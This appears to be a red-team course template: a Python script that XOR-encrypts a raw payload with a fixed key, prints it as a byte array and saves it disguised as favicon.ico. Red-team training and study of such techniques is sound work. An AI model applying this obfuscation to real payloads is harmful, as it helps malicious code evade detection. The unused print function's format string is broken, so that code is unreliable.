# Red Team Operator course code template
# payload encryption with XOR
#
# author: reenz0h (twitter: @sektor7net)

import sys

KEY = "mysecretkeee"

def xor(data, key):
    key = str(key).encode()
    l = len(key)
    output_bytes = bytearray()

    for i in range(len(data)):
        current = data[i] if isinstance(data, bytes) else ord(data[i])
        current_key = key[i % l]
        output_bytes.append(current ^ current_key)

    return output_bytes


def printCiphertext(ciphertext):
    print('{ ' + ', '.join('0x{{:02x}'.format(x) for x in ciphertext) + ' };')


try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = xor(plaintext, KEY)
print('{ 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')

filename = "favicon.ico"
with open(filename, "wb") as icon:
    icon.write(ciphertext)
